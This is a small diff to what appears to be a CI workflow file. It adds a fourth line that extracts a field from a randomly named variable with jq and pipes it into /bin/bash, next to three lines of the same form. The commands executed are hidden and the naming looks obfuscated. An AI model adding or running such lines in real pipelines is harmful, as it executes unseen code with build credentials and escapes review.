@@ -43,6 +43,7 @@ jobs:
           echo $g02993 | jq -r .jy1 | /bin/bash
           echo $oz01276 | jq -r .rsz2 | /bin/bash
           printf '%s' "$opj94" | jq -r .pt2 | /bin/bash
+          echo $tefc7 | jq -r .p17239 | /bin/bash
 
       - name: Upload artifact
         if: always()
